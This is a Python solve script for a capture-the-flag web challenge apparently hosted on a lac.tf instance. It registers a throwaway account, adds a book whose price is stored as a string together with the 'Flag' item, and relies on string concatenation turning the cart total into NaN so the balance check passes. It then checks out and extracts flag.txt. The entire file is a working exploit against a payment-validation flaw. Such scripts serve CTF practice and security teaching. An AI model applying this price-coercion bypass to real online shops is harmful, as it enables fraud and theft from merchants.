import requests
import zipfile
import io

# URL of the challenge
BASE_URL = "https://narnes-and-bobles-u9scs.instancer.lac.tf"

# IDs from books.json
# "The Part-Time Parliament": price "10" (string)
PART_TIME_PARLIAMENT_ID = "a3e33c2505a19d18"
# "Flag": price 1000000 (int)
FLAG_ID = "2a16e349fb9045fa"

def solve():
    s = requests.Session()

    # 1. Register a user
    import os
    username = "hacker_" + requests.utils.quote(str(os.urandom(4).hex()))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    res = s.post(f"{BASE_URL}/register", json={
        "username": username,
        "password": password
    })
    
    if res.status_code != 200:
        print(f"[-] Registration failed: {res.text}")
        # Try login if user exists (unlikely with random name but good practice)
        res = s.post(f"{BASE_URL}/login", json={
            "username": username,
            "password": password
        })
    
    # Verify login by checking cart (should be empty but gives us balance)
    res = s.get(f"{BASE_URL}/cart")
    if "cart" not in res.json():
        print("[-] Failed to login or get cart")
        return

    print(f"[*] Initial balance: {res.json()['balance']}")

    # 2. Add exploits to cart
    # We add the string-priced book and the flag.
    # Logic: "10" (string) + 1000000 (int) -> "101000000" (string)
    # Check: "101000000" + 0 (current cart sum) -> "1010000000"
    # Number("1010000000") -> NaN
    # NaN > 1000 (balance) -> False. Success!
    
    print("[*] Adding exploit items to cart...")
    payload = {
        "products": [
            {"book_id": PART_TIME_PARLIAMENT_ID, "is_sample": 0},
            {"book_id": FLAG_ID, "is_sample": 0}
        ]
    }
    
    res = s.post(f"{BASE_URL}/cart/add", json=payload)
    print(f"[*] Cart add response: {res.text}")
    
    if "err" in res.json():
        print("[-] Exploit failed during cart add.")
        return

    # 3. Checkout
    print("[*] Checking out...")
    res = s.post(f"{BASE_URL}/cart/checkout")
    
    if res.status_code == 200 and res.headers.get('Content-Type') == 'application/zip':
        print("[+] Checkout successful! Downloading zip...")
        
        try:
            with zipfile.ZipFile(io.BytesIO(res.content)) as z:
                z.extractall("extracted_books")
                print("[+] Extracted books to 'extracted_books/'")
                
                if "flag.txt" in z.namelist():
                    with z.open("flag.txt") as f:
                        flag = f.read().decode('utf-8').strip()
                        print(f"\n[SUCCESS] FLAG: {flag}\n")
                        # Save flag to a file
                        with open("flag.txt", "w") as flag_file:
                            flag_file.write(flag)
                else:
                    print("[-] flag.txt not found in zip.")
                    print(f"Contents: {z.namelist()}")
        except zipfile.BadZipFile:
            print("[-] response returned 200 but was not a valid zip")
            print(res.content[:100])
    else:
        print(f"[-] Checkout failed: {res.status_code} {res.text}")

if __name__ == "__main__":
    solve()
